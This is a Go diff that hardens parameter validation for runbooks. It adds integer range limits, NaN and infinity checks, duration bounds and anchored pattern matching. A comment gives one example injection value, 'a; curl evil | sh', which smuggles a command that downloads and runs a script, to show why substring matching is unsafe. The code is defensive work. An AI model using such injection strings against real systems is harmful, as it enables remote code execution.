@@ -75,9 +75,29 @@ func ValidateParams(rb *Runbook, params map[string]any) error {
 	return nil
 }
 
+// MaxSafeInt bounds int parameters. Parameters travel as JSON numbers (the
+// run record, the signed envelope), which carry integers exactly only up to
+// 2^53; past that a value would silently change on the way to the agent.
+const MaxSafeInt = 1<<53 - 1
+
 func coerceParam(name string, p Param, v any) (any, error) {
 	bad := func(format string, args ...any) (any, error) {
 		return nil, fmt.Errorf("parameter %q: "+format, append([]any{name}, args...)...)
+	}
+	matches := func(s string) error {
+		if p.Pattern == "" {
+			return nil
+		}
+		re, err := CompilePattern(p.Pattern)
+		if err != nil {
+			_, err := bad("invalid pattern")
+			return err
+		}
+		if !re.MatchString(s) {
+			_, err := bad("value %q does not match %s", s, p.Pattern)
+			return err
+		}
+		return nil
 	}
 	switch p.Type {
 	case "string":
@@ -88,14 +108,8 @@ func coerceParam(name string, p Param, v any) (any, error) {
 		if len(s) > 1024 {
 			return bad("value too long")
 		}
-		if p.Pattern != "" {
-			re, err := CompilePattern(p.Pattern)
-			if err != nil {
-				return bad("invalid pattern")
-			}
-			if !re.MatchString(s) {
-				return bad("value %q does not match %s", s, p.Pattern)
-			}
+		if err := matches(s); err != nil {
+			return nil, err
 		}
 		return s, nil
 	case "enum":
@@ -113,8 +127,13 @@ func coerceParam(name string, p Param, v any) (any, error) {
 		case int:
 			n = int64(x)
 		case float64:
-			if x != math.Trunc(x) {
+			// NaN, ±Inf and whole floats past int64 have no int64 value:
+			// the conversion is undefined (MinInt64 on amd64).
+			if math.IsNaN(x) || math.IsInf(x, 0) || x != math.Trunc(x) {
 				return bad("want integer, got %v", x)
+			}
+			if math.Abs(x) > MaxSafeInt {
+				return bad("integer %v is out of range (±%d)", x, int64(MaxSafeInt))
 			}
 			n = int64(x)
 		case string:
@@ -126,11 +145,28 @@ func coerceParam(name string, p Param, v any) (any, error) {
 		default:
 			return bad("want integer, got %T", v)
 		}
-		if p.Min != nil && float64(n) < toFloat(p.Min) {
-			return bad("below minimum %v", p.Min)
+		if n > MaxSafeInt || n < -MaxSafeInt {
+			return bad("integer %d is out of range (±%d)", n, int64(MaxSafeInt))
 		}
-		if p.Max != nil && float64(n) > toFloat(p.Max) {
-			return bad("above maximum %v", p.Max)
+		// |n| <= 2^53, so float64(n) is exact. A bound that isn't a number
+		// fails closed rather than reading as 0.
+		if p.Min != nil {
+			lo, ok := toFloat(p.Min)
+			if !ok {
+				return bad("invalid minimum %v", p.Min)
+			}
+			if float64(n) < lo {
+				return bad("below minimum %v", p.Min)
+			}
+		}
+		if p.Max != nil {
+			hi, ok := toFloat(p.Max)
+			if !ok {
+				return bad("invalid maximum %v", p.Max)
+			}
+			if float64(n) > hi {
+				return bad("above maximum %v", p.Max)
+			}
 		}
 		return n, nil
 	case "bool":
@@ -150,32 +186,82 @@ func coerceParam(name string, p Param, v any) (any, error) {
 		if !ok {
 			return bad("want duration string, got %T", v)
 		}
-		if _, err := time.ParseDuration(s); err != nil {
+		d, err := time.ParseDuration(s)
+		if err != nil {
 			return bad("invalid duration %q", s)
+		}
+		// Lint requires a pattern on `from` durations, so it must apply.
+		if err := matches(s); err != nil {
+			return nil, err
+		}
+		if p.Min != nil {
+			lo, ok := toDuration(p.Min)
+			if !ok {
+				return bad("invalid minimum %v", p.Min)
+			}
+			if d < lo {
+				return bad("below minimum %v", p.Min)
+			}
+		}
+		if p.Max != nil {
+			hi, ok := toDuration(p.Max)
+			if !ok {
+				return bad("invalid maximum %v", p.Max)
+			}
+			if d > hi {
+				return bad("above maximum %v", p.Max)
+			}
 		}
 		return s, nil
 	}
 	return bad("unknown type %q", p.Type)
 }
 
-func toFloat(v any) float64 {
+// toFloat reads an int bound: a number, or a string holding one.
+func toFloat(v any) (float64, bool) {
+	var f float64
 	switch x := v.(type) {
 	case float64:
-		return x
+		f = x
 	case int64:
-		return float64(x)
+		f = float64(x)
 	case int:
-		return float64(x)
+		f = float64(x)
 	case string:
-		f, _ := strconv.ParseFloat(x, 64)
-		return f
+		var err error
+		if f, err = strconv.ParseFloat(x, 64); err != nil {
+			return 0, false
+		}
+	default:
+		return 0, false
 	}
-	return 0
+	if math.IsNaN(f) {
+		return 0, false
+	}
+	return f, true
+}
+
+// toDuration reads a duration bound, which must be a duration string ("5m"):
+// a bare number has no unit.
+func toDuration(v any) (time.Duration, bool) {
+	s, ok := v.(string)
+	if !ok {
+		return 0, false
+	}
+	d, err := time.ParseDuration(s)
+	return d, err == nil
 }
 
 // CompilePattern compiles a parameter pattern so it must match the whole
 // value. Patterns are a security control on alert-derived input, and a
 // substring match ("[a-z]+" matching "a; curl evil | sh") would defeat it.
+//
+// Every pattern is anchored implicitly, so "[a-z]+" and "^[a-z]+$" mean the
+// same thing. The anchors are Go's: without (?m), $ matches only at the very
+// end of the value (unlike Perl or Python, not before a trailing newline), so
+// "^[a-z]+$" rejects "abc\n" and "abc\ndef". Flags set inside a pattern, such
+// as (?m), apply only within the wrapper's group, never to its anchors. A
+// pattern lets newlines through only if it matches them itself (\n, \s, (?s).).
 func CompilePattern(p string) (*regexp.Regexp, error) {
 	// The pattern must stand on its own: "a)|(.*" would otherwise close the
 	// wrapper's group and leave an unanchored alternative.
